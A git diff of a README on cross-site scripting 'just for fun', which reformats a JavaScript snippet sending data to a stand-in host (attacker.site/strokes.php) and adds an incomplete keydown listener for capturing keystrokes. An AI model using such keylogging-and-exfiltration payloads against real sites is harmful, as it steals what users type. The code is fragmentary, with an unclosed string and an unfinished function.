@@ -20,10 +20,14 @@ Cross-Site-Scripting just for fun.
   - To perform HTTP GET request
   ```
   var xhttp = new XMLHttpRequest(); //Init xhttp object
-	xhttp.open("GET", "https://attacker.site/strokes.php?data=data, true); //GET request
-	xhttp.send(); //Send request
+  xhttp.open("GET", "https://attacker.site/strokes.php?data=data, true); //GET request
+  xhttp.send(); //Send request
   ```
-  
+  - Collect pressed key
+  ```
+  document.addEventListener("keydown",function(e){
+  pressed_key = e.key;
+  ```
  
 ## Automated Detection
   ## xss4fun.py
